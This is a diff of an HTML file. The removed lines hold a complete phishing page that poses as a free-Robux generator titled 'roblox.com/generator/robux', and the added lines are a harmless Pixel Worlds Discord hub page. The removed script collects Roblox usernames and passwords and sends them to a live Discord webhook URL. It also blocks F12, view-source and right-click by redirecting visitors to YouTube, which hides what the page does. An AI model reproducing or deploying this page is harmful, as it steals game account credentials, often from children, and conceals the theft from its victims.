@@ -1,143 +1,85 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>roblox.com/generator/robux</title>
-  <link rel="icon" type="image/png" href="https://image2url.com/r2/default/images/1774275138892-2907d7ae-f094-44fa-b4dd-e391db859c70.png">
-  <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: #0f172a;
-      font-family: Arial, sans-serif;
-      color: white;
-      overflow: hidden;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pixel Worlds Hub</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #1e1e2f, #2a2a40);
+            color: #ffffff;
+            text-align: center;
+            padding: 40px;
+        }
 
-    .rain {
-      position: absolute;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      overflow: hidden;
-    }
+        .container {
+            max-width: 700px;
+            margin: auto;
+            background: rgba(0,0,0,0.3);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
 
-    .drop {
-      position: absolute;
-      width: 20px;
-      height: 20px;
-      background-image: url('https://image2url.com/r2/default/images/1774275138892-2907d7ae-f094-44fa-b4dd-e391db859c70.png');
-      background-size: cover;
-      opacity: 0.7;
-      animation: fall linear infinite;
-    }
+        h1 {
+            color: #00ffd5;
+        }
 
-    @keyframes fall {
-      0% { transform: translateY(-50px); }
-      100% { transform: translateY(100vh); }
-    }
+        ul {
+            text-align: left;
+            display: inline-block;
+            margin-top: 20px;
+        }
 
-    .frame {
-      position: relative;
-      background: #1e293b;
-      padding: 30px;
-      border-radius: 16px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-      text-align: center;
-      width: 320px;
-      z-index: 2;
-    }
+        li {
+            margin: 10px 0;
+        }
 
-    .buttons { display: flex; flex-direction: column; gap: 15px; margin-top: 20px; }
-    button { background: #111827; color: white; border: none; padding: 12px; border-radius: 12px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 16px; transition: 0.2s; }
-    button:hover { background: #374151; }
-    button img { width: 40px; height: 40px; border-radius: 8px; }
-    #result { margin-top: 20px; font-size: 18px; }
-    #nextBtn { margin-top: 15px; display: none; }
-    .hidden { display: none; }
-    input { width: 100%; padding: 8px; margin-top: 8px; border-radius: 8px; border: none; outline: none; background: #111827; color: white; font-size: 14px; }
-    #submitBtn { margin-top: 15px; }
-  </style>
+        .button {
+            display: inline-block;
+            margin-top: 30px;
+            padding: 15px 25px;
+            background: #5865F2;
+            color: white;
+            text-decoration: none;
+            font-size: 18px;
+            border-radius: 10px;
+            transition: 0.3s;
+        }
+
+        .button:hover {
+            background: #4752c4;
+        }
+    </style>
 </head>
 <body>
 
-  <div class="rain" id="rain"></div>
+    <div class="container">
+        <h1>Welcome to the ultimate hub for Pixel Worlds players!</h1>
 
-  <!-- FRAME 1 -->
-  <div class="frame" id="frame1">
-    <div class="buttons">
-      <button onclick="selectOption(500)"><img src="https://image2url.com/r2/default/images/1774275138892-2907d7ae-f094-44fa-b4dd-e391db859c70.png">500</button>
-      <button onclick="selectOption(1000)"><img src="https://image2url.com/r2/default/images/1774275138892-2907d7ae-f094-44fa-b4dd-e391db859c70.png">1000</button>
-      <button onclick="selectOption(5000)"><img src="https://image2url.com/r2/default/images/1774275138892-2907d7ae-f094-44fa-b4dd-e391db859c70.png">5000</button>
+        <p>
+            Whether you’re a trader, farmer, or just here to chill, everyone is welcome.
+        </p>
+
+        <h2>✨ What we offer:</h2>
+        <ul>
+            <li>• Active BP trading & deals</li>
+            <li>• Friendly & helpful community</li>
+            <li>• Fun events, giveaways, and competitions</li>
+            <li>• Tips & strategies to farm gems faster</li>
+        </ul>
+
+        <h2>⚔️</h2>
+        <p>
+            Join from the start, grow with us, and be part of a guild that’s all about fun, trading, and teamwork.
+        </p>
+
+        <a href="https://discord.gg/Tu63PcQVyK" class="button" target="_blank">
+            Join our Discord
+        </a>
     </div>
-    <div id="result">U Selected: None</div>
-    <button id="nextBtn" onclick="goNext()">Next</button>
-  </div>
-
-  <!-- FRAME 2 -->
-  <div class="frame hidden" id="frame2">
-    <h3>Enter Ur Roblox Username And Password To Get the reward.</h3>
-    <input id="input1" type="text" placeholder="Name">
-    <input id="input2" type="password" placeholder="Password">
-    <button type="button" id="submitBtn" onclick="sendWebhook()">Submit</button>
-  </div>
-
-  <script>
-    let selectedValue = null;
-
-    function selectOption(value) {
-      selectedValue = value;
-      document.getElementById('result').innerText = 'U Selected: ' + value;
-      document.getElementById('nextBtn').style.display = 'block';
-    }
-
-    function goNext() {
-      document.getElementById('frame1').classList.add('hidden');
-      document.getElementById('frame2').classList.remove('hidden');
-    }
-
-    function sendWebhook() {
-      const input1 = document.getElementById('input1').value;
-      const input2 = document.getElementById('input2').value;
-      const webhookUrl = 'https://discord.com/api/webhooks/1485646247577518131/to6KoQXfPfVx7aerg2D-19JmJYvShGkQVQo8FQrm_IbLoau-FrTXHERXEiVTCBW-O375';
-
-      const message = `Selected: ${selectedValue}\nName: ${input1}\nPassword: ${input2}`;
-
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: message })
-      })
-      .then(res => res.ok ? alert('Sent. it might take a few hours/days!') : alert('Error sending: ' + res.status))
-      .catch(err => alert('Fetch error: ' + err));
-    }
-
-    // RAIN EFFECT
-    const rain = document.getElementById('rain');
-    for (let i = 0; i < 30; i++) {
-      const drop = document.createElement('div');
-      drop.classList.add('drop');
-      drop.style.left = Math.random() * 100 + 'vw';
-      drop.style.animationDuration = (2 + Math.random() * 3) + 's';
-      drop.style.opacity = Math.random();
-      rain.appendChild(drop);
-    }
-
-    // BLOCK DEVTOOLS / VIEW SOURCE
-    document.addEventListener('keydown', function(e) {
-      if (e.key === 'F12' || (e.ctrlKey && e.key.toLowerCase() === 'u') || (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'i')) {
-        window.location.href = 'https://www.youtube.com/shorts/s7NLum2llU0?feature=share';
-      }
-    });
-    document.addEventListener('contextmenu', function(e) {
-      e.preventDefault();
-      window.location.href = 'https://www.youtube.com/shorts/s7NLum2llU0?feature=share';
-    });
-  </script>
 
 </body>
 </html>
